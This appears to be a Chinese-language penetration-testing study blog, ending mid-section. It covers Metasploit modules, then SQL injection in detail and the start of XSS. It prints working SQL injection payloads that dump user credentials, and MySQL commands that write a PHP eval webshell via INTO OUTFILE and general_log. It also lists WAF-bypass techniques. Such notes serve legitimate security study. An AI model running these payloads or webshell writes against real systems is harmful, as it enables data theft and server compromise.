(辅助模块)</h3><p>该模块不会直接在测试者和目标主机之间建立访问，它们只负责执行扫描、嗅探、指纹识别等相关功能以辅助渗透测试。</p><p>该模块不会直接在测试者和目标主机之间建立访问，它们只负责执行扫描、嗅探、指纹识别等相关功能以辅助渗透测试。</p><h3 id="2-Exploit-漏洞利用模块"><a class="header-anchor" href="#2-Exploit-漏洞利用模块">¶</a>2.Exploit (漏洞利用模块)</h3><p>漏洞利用是指由渗透测试者利用一个系统、应用或者服务中的安全漏洞进行的攻击行为。流行的渗透攻击技术包括缓冲区溢出、Web应用程序攻击，以及利用配置错误等，其中包含攻击者或测试人员针对系统中的漏洞而设计的各种POC验证程序，用于破坏系统安全性的攻击代码，每个漏洞都有相应的攻击代码。</p><h3 id="3-Payload-攻击载荷模块"><a class="header-anchor" href="#3-Payload-攻击载荷模块">¶</a>3.Payload (攻击载荷模块)</h3><p>攻击载荷是我们期望目标系统在被渗透攻击之后完成实际攻击功能的代码，成功渗透目标后，用于在目标系统上运行任意命令或者执行特定代码，在Metasploit框架中可以自由地选择、传送和植入。攻击载荷也可能是简单地在目标操作系统上执行一些命令，如添加用户账号等。</p><h3 id="4-Post-后期渗透模块"><a class="header-anchor" href="#4-Post-后期渗透模块">¶</a>4.Post (后期渗透模块)</h3><p>该模块主要用于在取得目标系统远程控制权后，进行一系列的后渗透攻击动作，如获取敏感信息、实施跳板攻击等。</p><h3 id="5-Encoders-编码工具模块-特征被标记烂了"><a class="header-anchor" href="#5-Encoders-编码工具模块-特征被标记烂了">¶</a>5.Encoders (编码工具模块)(特征被标记烂了)</h3><p>该模块在渗透测试中负责免杀，以防止被杀毒软件、防火墙、IDS及类似的安全软件检测出来。</p><h3 id="问题-v2"><a class="header-anchor" href="#问题-v2">¶</a>问题</h3><p>​BurpSuite如何抓 https 的包？</p><p>​答：把BP的证书导出 , 然后添加到浏览器信任的根证书机构中</p><p>​BurpSuite 如何抓外网的包?</p><p>​答：在用户选项中设置顶级代理（上游代理）</p><h1>SQL注入</h1><h2 id="基础知识"><a class="header-anchor" href="#基础知识">¶</a>基础知识</h2><h3 id="原理"><a class="header-anchor" href="#原理">¶</a>原理</h3><p>**概念：**SQL注入（ SQL injection ）是一种将恶意代码插入到程序 SQL 语句中，从而误导数据库执行恶意逻辑的攻击技术。通过 SQL 注入，攻击者可以达到获取敏感信息，窃取访问权限等目的。sql注入属于服务端攻击 , 和操作系统和编程语言无关。</p><p>​目标站点没有对<strong>用户在Web表单递交或输入域名的页面请求</strong>的查询字符串进行严格的过滤与验证导致拼接的SQL语句被带入到数据库执行从而获取数据库信息以及接管权限的WEB攻击漏洞！</p><p><strong>条件:</strong></p><ol><li>参数是用户可控的，也就是前端传入后端的参数的内容是用户可以控制的。</li><li>参数被带入数据库进行查询，也就是传入的参数被拼接到SQL语句中并被带入到数据库进行查询。</li></ol><h3 id="注入判断"><a class="header-anchor" href="#注入判断">¶</a>注入判断</h3><p>**顺序：**1.注入类型判断</p><p>​2.闭合方式判断</p><p>​3.判断是否存在注入</p><p>​4.注入攻击</p><p><strong>类型判断：</strong></p><blockquote><p>区分数字和字符：</p><p>id = 1查看页面，默认页面。<br>id = 2-1，如果它显示的出来的页面和id = 1的页面一样，我们就认为它是数字型。<br>id = 2-1，如果它显示出来是id = 2的页面，我就认为它是字符型。4</p></blockquote><p>​数字型注入：直接判断是否存在注入</p><p>​字符型注入：使用单引号/双引号</p><blockquote><p>比如存在单引号注入的，在URL后添加一个单引号，页面回报错，因为单引号和前面的单引号闭合了导致语法错误，在再后面跟一个” --“页面恢复正常，因为原本代码中的单引号被注释掉了。</p></blockquote><p><strong>闭合方式判断（字符型）</strong></p><p><code>' </code> <code>&quot;</code>  <code>)</code> <code>')</code> <code>&quot;) </code>   <code>'))</code>  <code>&quot;))</code> <code>&#125;</code>等</p><p><strong>判断是否存在注入</strong></p><p>在闭合后与注释前进行逻辑判断，根据页面返回的结果来进行判断是否执行逻辑判断！</p><p>判断注入<br>?id=1’     //报错<br>?id=1’–+  //正常<br>?id=1’and 1=1–+  //正常<br>?id=1’and 1=2–+  //错误</p><p>逻辑与   and 1=1 (返回正常页面) --&gt; and 1=2 (返回错误页面,存在注入)<br>逻辑或   or  1=1 (返回正常页面，存在注入) --&gt; or 1=2 (返回正常页面，存在注入)<br>逻辑异或 xor 1=1(返回错误页面) --&gt; xor 1=2 (返回正常页面，存在注入)</p><p>在闭合后与注释前进行逻辑判断，根据页面返回的结果来进行判断是否执行逻辑判断！<br>逻辑与   and 1=1 (返回正常页面) --&gt; and 1=2 (返回错误页面,存在注入)<br>逻辑或   or  1=1 (返回正常页面，存在注入) --&gt; or 1=2 (返回正常页面，存在注入)<br>逻辑异或 xor 1=1(返回错误页面) --&gt; xor 1=2 (返回正常页面，存在注入)</p><blockquote><p>如果页面都没有变化也可能是存在盲注。</p></blockquote><h3 id="注入流程（手工）"><a class="header-anchor" href="#注入流程（手工）">¶</a>注入流程（手工）</h3><blockquote><p>充分掌握手工注入方法以便在后续存在WAF的情况下进行绕过，而工具半自动化选择掌握SQLmap能够更有效率的实现Web攻击！</p></blockquote><ol><li><strong>判断字段数</strong></li></ol><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs sql">?id<span class="hljs-operator">=</span><span class="hljs-number">1</span><span class="hljs-string">&#x27;order by 3--+  //正常</span><br><span class="hljs-string">?id=1&#x27;</span><span class="hljs-keyword">order</span> <span class="hljs-keyword">by</span> <span class="hljs-number">4</span><span class="hljs-comment">--+  //错误</span><br></code></pre></td></tr></table></figure><blockquote><p>SQL语言中,order by 是一个常用的排序语句；默认升序(asc,从小到大)也可指定降序(desc,从大到小)<br>eg:select * from users order by id desc;<br>Group by 则是进行分组查询数据，其后面跟列名或字段数；</p></blockquote><ol start="2"><li><strong>确定回显点</strong></li></ol><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql">?id<span class="hljs-operator">=</span><span class="hljs-number">-1</span><span class="hljs-string">&#x27;UNION SELECT 1,2,3--+ </span><br></code></pre></td></tr></table></figure><blockquote><p><strong>union select联合查询的执行条件是前面的是false时才会去执行后面的语句</strong>，而id=-1不成立为false…</p></blockquote><ol start="3"><li><strong>查询数据库相关信息</strong></li></ol><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql">?id<span class="hljs-operator">=</span><span class="hljs-number">-1</span><span class="hljs-string">&#x27;UNION SELECT 1,CONCAT_WS(CHAR(32,58,32),user(),database(),version()),3--+</span><br></code></pre></td></tr></table></figure><ol start="4"><li><strong>查询数据库下的表信息</strong></li></ol><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql">?id<span class="hljs-operator">=</span><span class="hljs-number">-1</span><span class="hljs-string">&#x27;union select 1,2,group_concat(table_name) from information_schema.tables where table_schema=&#x27;</span>security<span class="hljs-string">&#x27;--+  </span><br></code></pre></td></tr></table></figure><ol start="5"><li><strong>查询表下的字段信息</strong></li></ol><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql">?id<span class="hljs-operator">=</span><span class="hljs-number">-1</span><span class="hljs-string">&#x27;union select 1,2,group_concat(column_name) from information_schema.columns where table_name=&#x27;</span>users<span class="hljs-string">&#x27;--+   </span><br></code></pre></td></tr></table></figure><ol start="6"><li><strong>查询字段内容</strong></li></ol><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql">?id<span class="hljs-operator">=</span><span class="hljs-number">-1</span><span class="hljs-string">&#x27; union select 1,2,group_concat(username ,id , password) from users--+</span><br></code></pre></td></tr></table></figure><blockquote><p>补充：使用 sql 注入遇到转义字符串的单引号或者双引号，可使用 HEX 编码绕过</p><p>函数解释：</p><p>concat(str1,str2)      //没有分隔符的连接字符串<br>concat_ws(str,str2)         //含有分隔符的连接字符串<br>group_concat(str1,str2)    //连接一个组的所有字符串，并以逗号分隔每一条数据</p></blockquote><h3 id="SQL注入危害"><a class="header-anchor" href="#SQL注入危害">¶</a>SQL注入危害</h3><p>**● 数据库信息泄露：**泄露数据库中存放的数据，用户隐私等；</p><p>**● 获取webshell：**当权限为root且知道绝对路径时，可以直接写入一句话木马到服务器</p><p>**● 网页篡改：**注入出后台管理员用户，登录后台发布恶意数据、篡改后台数据等；</p><p>**● 网站挂马：**当拿到webshell或者获取到服务器权限后，可将一些网页木马挂在服务器上，去攻击别人；</p><p>**● 获取系统权限：**当权限足够高时，可以获取系统主机的权限；</p><p>**● 万能密码：**利用特定的payload登录后台或其他页面；</p><p>**● 文件读取：**读取敏感文件…;</p><p><strong>SQL注入类型</strong></p><img src="/posts/d62edc36/1683710868825-3bcd85b4-887e-4ef2-8e61-685cef9d7fd9.png" class title="img"><h3 id="基础SQL知识"><a class="header-anchor" href="#基础SQL知识">¶</a>基础SQL知识</h3><p><strong>information_schema库</strong></p><blockquote><p>在Mysql数据库5.0版本之后数据库的作用如下：其中information_schema数据库是MySQL自带的，它提供了访问数据库元数据的方式。<strong>元数据是关于数据的数据</strong>，如数据库名或表名，列的数据类型，或访问权限等；并且在 MySQL中，把 information_schema 看作是一个数据库，确切说是信息数据库。其中保存着关于MySQL服务器所维护的所有其他数据库的信息。如数据库名，数据库的表，表栏的数据类型与访问权限等；</p></blockquote><ul><li><p>**information_schema：**是MySQL自带的数据库，主要保持MySQL数据库服务器的系统信息，比如数据库的名称，数据库表的名称，字段名称，存储权限等。</p><p>三个重要的表：</p><p>​● <strong>information_schema.schemata</strong>:    该数据表存储了mysql数据库中的所有数据库的库名</p><p>​三个重要字段：</p><p>​<strong>schema_name</strong>字段储存的就是数据库的名称(是当前数据库中的所有数据库名称)。</p><p>​<strong>tables</strong>表是用于储存所有表名，其中table_schema:字段是数据库名称而table_name:字段是表名。</p><p>​<strong>columns</strong> 表是储存字段名称，其中table_schema:字段是数据库名称，而table_name:字段是表名最后column_name:字段是字段名称。</p><p>​● <strong>information_schema.tables</strong>：     该数据表存储了mysql数据库中的所有数据表的表名<br>​● <strong>information_schema.columns</strong>:     该数据表存储了mysql数据库中的所有列的列名</p></li><li><p>**performance_schema：**是MySQL系统自带的数据库，可以用来监控MySQL的各类性能指标。</p></li><li><p>**mysql：**保存MySQL的权限、参数、对象和状态信息。</p></li></ul><h3 id="各种注入"><a class="header-anchor" href="#各种注入">¶</a>各种注入</h3><h4 id="搜索注入"><a class="header-anchor" href="#搜索注入">¶</a>搜索注入</h4><p><strong>原理</strong></p><p>SQL语句原型：</p><p><code>SELECT * FROM 表名 WHERE 字段名 like '%d%'</code></p><p>like 支持类型<br>Like主要支持两种通配符，分别是&quot;_“和”%&quot;。<br>&quot;__&quot;代表匹配1个任意字符，常用于充当占位符；<br>&quot;%&quot;代表匹配0个或多个任意字符。</p><p><strong>实操</strong></p><p>​在搜索的内容后面添加单引号尝试闭合报错，在从单引号添加模糊匹配的百分号即&quot;%'&quot;在进行闭合成功</p><p>?name=hahaha’&amp;submit=搜索    //错误<br>?name=hahaha%'–+&amp;submit=搜索   //正常</p><p>​之后的处理方式和普通的联合注入相同，将联合注入语句放在<code>'</code>后。</p><h4 id="报错注入"><a class="header-anchor" href="#报错注入">¶</a>报错注入</h4><p><strong>原理</strong></p><p>​报错注入用在数据库的错误信息会回显在网页中的情况，如果联合查询不能使用则首选报错注入；其报错注入利用的是数据库的报错信息得到数据库的内容，且还需要构造语句让数据库报错。</p><p><em>双查询</em><br>一个查询语句包含一个查询语句，实际上是报错注入的一种；且需要联合着MYSQL的BUG报错来进行报错注入.</p><p><em>MySQL的BUG</em></p><p>rand() //随机函数   random</p><p>floor()   //取整数<br>count()   //汇总函数<br>group by  //分组语句<br>BUG:当在一个聚合函数，比如count函数后面如果使用分组语句就会把查询的一部分一错误形式显示出来<br>select count(*),concat((select user()),(floor(rand() * 2))) as a from information_schema.tables group by a;</p><p><strong>报错注入函数</strong></p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs stylus"><span class="hljs-function"><span class="hljs-title">extractvalue</span><span class="hljs-params">()</span></span>     其中原理主要是:xpath语法错误<br><span class="hljs-function"><span class="hljs-title">updatexml</span><span class="hljs-params">()</span></span><br><span class="hljs-function"><span class="hljs-title">floor</span><span class="hljs-params">()</span></span><br><span class="hljs-function"><span class="hljs-title">exp</span><span class="hljs-params">()</span></span><br><span class="hljs-function"><span class="hljs-title">multipoint</span><span class="hljs-params">()</span></span><br><span class="hljs-function"><span class="hljs-title">polygon</span><span class="hljs-params">()</span></span><br><span class="hljs-function"><span class="hljs-title">linestring</span><span class="hljs-params">()</span></span><br></code></pre></td></tr></table></figure><p><strong>extractvalue()函数</strong></p><pre><code class="hljs"> extractvalue(xml_frag,xpath_expr)函数接受两个参数，第一个为**XML标记内容**，也就是查询的内容，第二个为**XPATH路径**，也就是查询的路径。如果没有匹配内容，不管出于何种原因，只要 xpath_expr有效，并且 xml_frag由正确嵌套和关闭的元素组成 - 返回空字符串。不区分空元素的匹配和无匹配。但是如果XPATH写入错误格式，就会报错，并且返回我们写入的非法内容。</code></pre><p>eg:</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-keyword">select</span> username <span class="hljs-keyword">from</span> security.users <span class="hljs-keyword">where</span> id<span class="hljs-operator">=</span><span class="hljs-number">1</span> <span class="hljs-keyword">and</span> (extractvalue(<span class="hljs-number">1</span>,concat(<span class="hljs-string">&#x27;~&#x27;</span>,<span class="hljs-built_in">substring</span>((<span class="hljs-keyword">select</span> database()),<span class="hljs-number">1</span>,<span class="hljs-number">5</span>))));<br></code></pre></td></tr></table></figure><p><strong>updatexml()函数</strong></p><p>​updatexml(xml_target,xpath_expr,new_xml)接受三个参数，此函数将XML标记的给定片段的单个部分替换为xml_target新的XML片段new_xml，然后返回更改的XML。xml_target替换的部分 与xpath_expr 用户提供的XPath表达式匹配。如果未xpath_expr找到表达式匹配 ，或者找到多个匹配项，则该函数返回原始 xml_targetXML片段。所有三个参数都应该是字符串。与extractvalue()类似，如果XPATH写入错误格式，就会报错，并且返回我们写入的非法内容。</p><p>详细解析：<a href="https://blog.csdn.net/m0_60988110/article/details/123544853?ops_request_misc=%257B%2522request%255Fid%2522%253A%2522168958636516800188531170%2522%252C%2522scm%2522%253A%252220140713.130102334..%2522%257D&amp;request_id=168958636516800188531170&amp;biz_id=0&amp;utm_medium=distribute.pc_search_result.none-task-blog-2~all~sobaiduend~default-4-123544853-null-null.142%5Ev88%5Einsert_down38v5,239%5Ev2%5Einsert_chatgpt&amp;utm_term=updatexml%28%29%E5%87%BD%E6%95%B0&amp;spm=1018.2226.3001.4187">updatexml函数-报错注入原理学习</a></p><h4 id="堆叠查询注入"><a class="header-anchor" href="#堆叠查询注入">¶</a>堆叠查询注入</h4><p>​在分号结束后并不会结束执行，继续构造下一条语句，语句依然会被执行。<strong>union或者union all</strong>执行的语句类型有限，而堆叠注入可以执行的是<strong>任意的SQL语句。</strong></p><p>使用条件苛刻，其可能受到API或者数据库引擎，又或者权限的限制只有当调用数据库函数支持执行多条sql语句时才能够使用，利用mysqli_multi_query() 函数就支持多条sql语句同时执行，但实际情况中，如PHP为了防止sql注入机制，往往使用调用数据库的函数是mysqli_ query()函数，其只能执行一条语句，分号后面的内容将不会被执行，所以可以说堆叠注入的使用条件十分有限，一旦能够被使用，将可能对网站造成十分大的威胁。</p><h4 id="基于布尔的盲注"><a class="header-anchor" href="#基于布尔的盲注">¶</a>基于布尔的盲注</h4><p>​即在页面没有错误回显时完成的注入攻击，此时我们输入的语句让页面呈现出两种状态，相当于True和False，而根据这两种状态可以判断我们输入的语句是否查询成功。</p><p>​<strong>流程</strong>：</p><img src="/posts/d62edc36/1683710880582-3d46ca6b-9367-4f1e-8ca6-448bd146cb98.png" class title="img"><h4 id="基于时间的盲注"><a class="header-anchor" href="#基于时间的盲注">¶</a>基于时间的盲注</h4><p>​基于时间的盲注也叫做延时注入，<strong>数据交互完成以后目标网站没有错误和正确的页面回显也没有布尔类型状态</strong>，此时我们可以考虑使用延时盲注其利用条件较为苛刻，这种情况我们可以利用时间函数来判断数据有没有在目标数据中得到执行，当然也需要构造闭合。</p><p>​<strong>基础知识：</strong></p><p>​<strong>if()函数  条件判断函数</strong><br>​if(a,b,c)  if判断句，a为条件，b、c为执行语句；如果a为真就执行b，a为假就执行c;</p><p>​<strong>sleep()函数</strong></p><p>网页延迟n秒后，输出结果</p><p>​<strong>ascii()函数/ord()函数</strong></p><p>将某个字符串转化为ascii值<br><strong>length()函数</strong></p><p>获取字符串的长度<br><strong>substr()/substring()/mid()函数</strong><br>此函数是用来截取字符串一部分。substr(column_name,start,[length]),length为可选项。</p><p>​<strong>时间盲注判断</strong><br>​?id=1’ and sleep(10)–+<br>​?id=1’ and if(1=2,1,sleep(10))–+</p><h4 id="HTTP头部注入"><a class="header-anchor" href="#HTTP头部注入">¶</a>HTTP头部注入</h4><p>​常见的SQL注入一般是通过请求参数或者表单进行注入，而HTTP头部注入是通过HTTP协议头部字段值进行注入，<strong>HTTP头注入常存在于以上地方…即：User-Agent/Cookie/Referer/X-Forwarded-For</strong></p><p><strong>产生条件</strong></p><ol><li><p>能够对请求头消息进行修改</p></li><li><p>修改的请求头信息能够带入数据库进行查询</p></li><li><p>数据库没有对输入的请求信息做过滤</p></li></ol><h4 id="宽字节注入"><a class="header-anchor" href="#宽字节注入">¶</a>宽字节注入</h4><p>​宽字节是指多个字节宽度的编码，GB2312、GBK、GB18030、BIG5、Shift_JIS等这些都是常说的宽字节，实际上只有两个自己。转移函数对这些编码进行转义时会将转义字符<code>'\'</code>转为**%5c**,于是我们在他们前面输入一个单字符编码与他组成一个新的多字符编码，使得原本的转义字符没有发生作用。</p><blockquote><ul><li><p>当某字符得大小为一个字节时，称其字符为窄字节</p></li><li><p>当某字符得大小为两个字节时，称其字符为宽字节</p></li><li><p>常见的宽字节编码：GB2312、GBK、GB18030、BIG5、Shift_JIS等</p></li></ul></blockquote><p><strong>原理</strong>：</p><p>​由于在数据库查询前使用了GBK多字节编码，即在汉字编码范围内使用两个字节会被编码为一个汉字(前一个ASCII码要大于128才到汉字的范围)，然后MySQL服务器会对查询语句进行GBK编码，即在前面加上%df’转义函数会将%df’改成%df'而\的URL编码为%5c,那最后变成了%df%5c’并且在GBK中这两个字节对应着一个汉字&quot;運&quot;,也就是说转义已经失去了作用，%df’被认为成運’ 成功消除了转义函数的影响</p><h4 id="二阶注入"><a class="header-anchor" href="#二阶注入">¶</a>二阶注入</h4><p><strong>原理</strong></p><p>​二次注入就是由于将数据存储进数据库中时未做好过滤，先提交构造好的特殊字符请求存储进数据库，然后提交第二次请求时与第一次提交进数据库的字符发生了作用，形成一条新的SQL语句被执行。</p><h4 id="DNSlog外带注入"><a class="header-anchor" href="#DNSlog外带注入">¶</a>DNSlog外带注入</h4><p>​在实际的应用场景中，我们一般在进行SQL盲注时，为了效率，在load_file()函数未被禁用的情况下，我们可以结合一些dnslog平台，进行外带注入；</p><p>​不管是布尔类型盲注还是时间盲注，都需要发送大量的数据包去判断数据，而这很可能会触发WAF的防护，因此导致被封IP。所以，如果条件允许，我们可以结合DNSlog来快速的回显数据。MySQL数据库，<strong>通过DNSlog盲注需要用到 load_file() 函数，该函数不仅能加载本地文件，同时也能对URL发起请求</strong>。<strong>因此需要使用 load_file() 函数，需要root权限，并且 secure_file_priv 需要为空。</strong></p><h4 id="GetShell"><a class="header-anchor" href="#GetShell">¶</a>GetShell</h4><p><strong>into outfile()</strong></p><p>在利用<a href="https://so.csdn.net/so/search?q=sql%E6%B3%A8%E5%85%A5&amp;spm=1001.2101.3001.7020">sql注入</a>漏洞后期，最常用的就是通过mysql的file系列函数来进行读取敏感文件或者写入webshell，其中比较常用的函数有以下三个：</p><ul><li><p>into dumpfile()</p></li><li><p>into outfile()</p></li><li><p>load_file()</p></li><li><p>Web目录具有写入权限，能够使用单引号</p></li><li><p>知道网站绝对路径(网站根目录)</p></li><li><p>secure_file_priv没有具体值(在mysql/my.ini中查看)</p></li></ul><p><a href="https://blog.csdn.net/whatday/article/details/102806591?ops_request_misc=&amp;request_id=&amp;biz_id=102&amp;utm_term=dump%20outfile&amp;utm_medium=distribute.pc_search_result.none-task-blog-2~all~sobaiduweb~default-1-102806591.142%5Ev88%5Einsert_down38v5,239%5Ev2%5Einsert_chatgpt&amp;spm=1018.2226.3001.4187">mysql注入中的outfile、dumpfile、load_file函数详解</a></p><p><strong>secure_file_priv</strong><br>secure_file_priv是用来限制load dumpfile、into outfile、load_file()函数在哪个目录下拥有上传和读取（导入导出）文件的权限。在mysql 5.6.34版本以后 secure_file_priv的值默认为NULL。如下关于secure_file_priv的配置介绍</p><p>secure_file_priv的值为null ，表示限制mysqld <strong>不允许</strong>导入|导出<br>当secure_file_priv的值为/tmp/ ，表示限制mysqld 的导入|导出只能发生在/tmp/目录下<br>当secure_file_priv的值没有具体值时，表示不对mysqld 的导入|导出做限制</p><p><strong>into dumpfile()和into outfile()的差异</strong></p><p>​outfile函数可以导出多行，而dumpfile只能导出一行数据。<br>​ outfile函数在将数据写到文件里时有特殊的格式转换，而dumpfile则保持原数据格式。</p><p><strong>–os-shell</strong></p><p>在SQLmap中的–os-shell就是使用udf提权获取WebShell。也是通过into oufile向服务器写入两个文件，一个可以直接执行系统命令，一个进行上传文件！</p><p>​<strong>条件</strong></p><p>​1.要求为数据库DBA，使用–is-dba查看当前网站连接的数据库账号是否为mysql user表中的管理员如root，是则为dba</p><pre><code class="hljs">2. secure_file_priv没有具体值</code></pre><p>​3. 知道网站的绝对路径</p><blockquote><p>在使用SQLMAP写Shell时候知道网站根目录但就是写不进去，可能是由于secure_file_priv的值为NULL那么可以使用以下方式获取这个字段值是什么<br><a href="http://sqlmap.py">sqlmap.py</a> -u “xxx” --sql-shell</p></blockquote><h2 id="SQL注入防御手段"><a class="header-anchor" href="#SQL注入防御手段">¶</a>SQL注入防御手段</h2><ol><li>函数过滤，如!is_numeric 涵数    //判断变量 id 是否为数字</li><li>直接下载相关防范注入文件，通过 incloud 包含放在网站配置文件里面，如 360、阿里云、腾迅提供的防注入脚本</li><li>使用白名单过滤</li><li>采用 PDO 预处理</li><li>使用 Waf 拦截</li></ol><h3 id="问题-v3"><a class="header-anchor" href="#问题-v3">¶</a>问题</h3><p><strong>如果存在SQL注入怎么判断不同的数据库?</strong></p><p>1.通过不同数据库对特定函数的处理不同</p><p>2.通过sql语法的差异</p><p><strong>注入常用函数</strong></p><p>version() user() database() concat() group_concat()</p><p><strong>mysql的网站注入，5.0以上和5.0以下有什么区别？</strong></p><p>5.0以下是多⽤户单操作，5.0以上是多⽤户多操作</p><p>5.0以下版本不存在information_schema数据库</p><p>5.0以上⽀持⼀些函数</p><p><strong>SQL注入写shell的条件</strong></p><p>1.数据库权限为dba（管理员权限）</p><p>2.secure_file_priv值为空</p><p>3.知道网站的绝对路径</p><p><strong>在时间盲注时若是sleep函数被过滤怎么办？</strong></p><p>使⽤ BENCHMARK(5000000,MD5(0x704c6b65))</p><p><strong>站点扫不到3306端口开放是什么原因？（为何一个 mysql 数据库的站，只有一个 80 端口开放）</strong></p><p>1.更改了数据库端口，没有扫描出来。</p><p>2.站库分离。</p><p>3.3306 端口不对外开放</p><p><strong>mysql写shell的方式</strong></p><p><em>⼀、创建数据表导入 shell</em></p><p>CREATE TABLE <code>mysql</code>.<code>shadow9</code> (<code>content</code> TEXT NOT NULL );</p><p>INSERT INTO <code>mysql</code>.<code>shadow9</code> (<code>content</code> ) VALUES (‘<?php @eval($_POST[pass]);?>’);</p><p>SELECT <code>content</code> FROM <code>shadow9</code> INTO OUTFILE ‘C:\phpStudy\WWW\90sec.php’;</p><p>DROP TABLE IF EXISTS <code>shadow9</code>;</p><p><em>⼆、⼀句话导入 shell</em></p><p>select ‘<?php @eval($_POST[pass]);?>’ into outfile ‘c:/phpstudy/www/90sec.php’;</p><p><em>三、⽇志备份获取 shell</em></p><p>show global variables like “%genera%”; //查询 general_log 配置</p><p>set global general_log=‘on’; //开启 general log 模式</p><p>SET global general_log_file=‘D:/phpStudy/WWW/cmd.php’; //设置⽇志⽂件保存路径</p><p>SELECT ‘<?php phpinfo();?>’; //phpinfo()写⼊⽇志⽂件</p><p>set global general_log=‘off’; //关闭 general_log 模式</p><h2 id="各种数据库的注入"><a class="header-anchor" href="#各种数据库的注入">¶</a>各种数据库的注入</h2><p>​待补充…………</p><h1>SQL注入的WAF绕过（太多了慢慢补充<sup>V</sup>）</h1><p><a href="https://blog.csdn.net/csdnmmd/article/details/122721133">常见WAF与WAF识别工具</a></p><p><strong>空格字符绕过</strong></p><p><strong>大小写绕过</strong></p><p><strong>浮点数绕过注入</strong></p><p><strong>NULL 值绕过</strong></p><p><strong>引号绕过</strong></p><p><strong>添加库名绕过</strong></p><p><strong>去重复绕过</strong></p><p><strong>反引号绕过</strong></p><p><strong>脚本语言特性绕过</strong></p><p><strong>逗号绕过</strong></p><p><strong>substr 截取字符串</strong></p><p><strong>mid 截取字符串</strong></p><p><strong>使用 join 绕过</strong></p><p><strong>like 绕过</strong></p><p><strong>limit offset 绕过</strong></p><p><strong>or and xor not 绕过</strong></p><p><strong>ascii 字符对比绕过</strong></p><p><strong>等号绕过</strong></p><p><strong>双关键词绕过</strong></p><p><strong>二次编码绕过</strong></p><p><strong>多参数拆分绕过</strong></p><p><strong>使用生僻函数绕过</strong></p><p><strong>分块传输绕过</strong></p><p><strong>信任白名单绕过</strong></p><p><strong>静态文件绕过</strong></p><p><strong>pipline 绕过注入</strong></p><p><strong>利用 multipart/form-data 绕过</strong></p><p><strong>order by 绕过</strong></p><p><strong>运行大量字符绕过</strong></p><p><strong>花扩号绕过</strong></p><p><strong>使用 ALL 或者 DISTINCT 绕过</strong></p><p><strong>换行混绕绕过</strong></p><p><strong>编码绕过</strong></p><p><strong>HTTP 数据编码绕过</strong></p><p><strong>url 编码绕过</strong></p><p><strong>Unicode 编码绕过</strong></p><p><strong>union select 绕过</strong></p><h1>XSS</h1><blockquote><p>​XSS 攻击全称跨站脚本攻击。XSS 是一种在 web 应用中的计算机安全漏洞，它允许恶意 web 用户将代码植入到 web 网站里面，供给其它用户访问，当用户访问到有恶意代码的网页就会产生 xss 攻击。</p></blockquote><h2 id="基础"><a class="header-anchor" href="#基础">¶</a>基础</h2><p><strong>原理</strong>：</p><p>​目标未对用户从前端功能点输入的数据与输出的内容进行处理或者处理不当，从而导致恶意的JS代码被执行造成窃取用户信息/劫持WEB行为危害的WEB漏洞！</p><p><strong>危害</strong>：</p><ul><li><p>网站挂马(WebShell)–&gt;攻击型网马(Google)</p></li><li><p>非法转账(Cookie窃取)</p></li><li><p>强制发送电子邮件</p></li><li><p>控制受害者机器向其它网站发起攻击</p></li><li><p>盗窃企业重要的具有商业价值的资料</p></li><li><p>控制企业数据，包括读取、篡改、添加、删除企业敏感数据的能力</p></li><li><p>盗取各类用户帐号，如机器登录帐号、用户网银帐号、各类管理员帐号</p></li></ul><h2 id="XSS类型"><a class="header-anchor" href="#XSS类型">¶</a>XSS类型</h2><h3 id="反射型XSS"><a class="header-anchor" href="#反射型XSS">¶</a>反射型XSS</h3><p>​反射型 XSS为非持久化攻击,需要欺骗用户自己去点击链接才能触发 XSS 代码,反射型 xss 攻击的方法为：攻击者通过发送邮件或诱导等方法，将包含有 xss 恶意链接发送给目标用户，当目标用户访问该链接时，服务器将接收该用户的请求并进行处理，然后服务器把带有 xss 恶意脚本发送给目标用户的浏览器，浏览器解析这段带有 xss 代码的恶意脚本后，就会触发 xss 攻击。</p><p><strong>漏洞挖掘点</strong></p><p>​网站的搜索栏、用户登录入口、输入表单等地方，常用来窃取客户端cookies或钓鱼欺骗。</p><p><strong>攻击流程</strong></p><ol><li>攻击者将Payload放置在URL连接中(针对的是GET型反射XSS)</li><li>通过社会工程学使用户点击改恶意链接</li><li>Web服务器将XSS代码（JavaScript代码）以及视图返回给客户端</li><li>客户端解析视图以及XSS代码(JavaScript代码)，并执行结果发送到XSS平台</li><li>攻击者访问XSS平台，读取窃取到的用户敏感信息(Cookid)</li></ol><h3 id="存储型XSS"><a class="header-anchor" href="#存储型XSS">¶</a>存储型XSS</h3><p>​存储型 XSS为持久化攻击，代码是存储在服务器中的数据库里，如在个人信息或发表文章等地方，可以插入代码，如果插入的数据没有过滤或过滤不严，那么这些恶意代码没有经过过滤将储存到数据库中，用户访问该页面的时候，没有进行编码过滤输出到浏览器上，就会触发代码执行，造成 xss 攻击。</p><p><strong>漏洞挖掘点</strong></p><ol><li><p>攻击者向Web界面插入恶意的XSS攻击代码</p></li><li><p>Web服务器会将其结果保存到数据库中</p></li><li><p>用户正常访问Web页面</p></li><li><p>Web页面将数据库的数据以及视图返回给前端，前端渲染并加载恶意的数据</p></li><li><p>客户端渲染视图，加载XSS代码并向攻击者的Web服务器发送敏感信息</p></li><li><p>攻击者读取用户的敏感信息</p></li></ol><h3 id="Dom类型XSS"><a class="header-anchor" href="#Dom类型XSS">¶</a>Dom类型XSS</h3><p>​DOM，全称 <code>Document Object Model</code>，是一个平台和语言都中立的接口，可以使程序和脚本能够动态访问和更新文档的内容、结构以及样式。 DOM 型 XSS 其实是一种特殊类型的反射型 XSS，它是基于 DOM 